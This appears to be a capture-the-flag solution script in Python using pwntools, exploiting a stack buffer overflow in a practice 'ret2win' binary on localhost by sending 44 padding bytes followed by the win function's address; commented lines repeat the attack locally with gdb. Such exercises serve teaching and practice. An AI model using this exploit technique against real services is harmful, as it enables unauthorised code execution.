#!/usr/bin/env python3
from pwn import *

host = '127.0.0.1'
port = 32771
conn = remote(host,port)
print(conn.recvline())
elf = ELF('../../ctfdev2/ret2win')
winfunc = p32(elf.symbols['win'])
payload = b'a'*44+winfunc
conn.sendline(payload)
print(conn.recvline().decode().strip())

conn.interactive()

# elf = ELF('ret2win')
# p = elf.process()
# print(elf.symbols['win'])
# print(winfunc)
# # conn = remote(host, port)
# payload = b'a'*44+winfunc
# print(payload)
# p.sendline(payload)
# # gdb.attach(p
# #            ,gdbscript=f"""
# #             break *vuln+106
# #             r <<< {payload}
# #             """)
# print(p.recvline().decode().strip())

# p.interactive()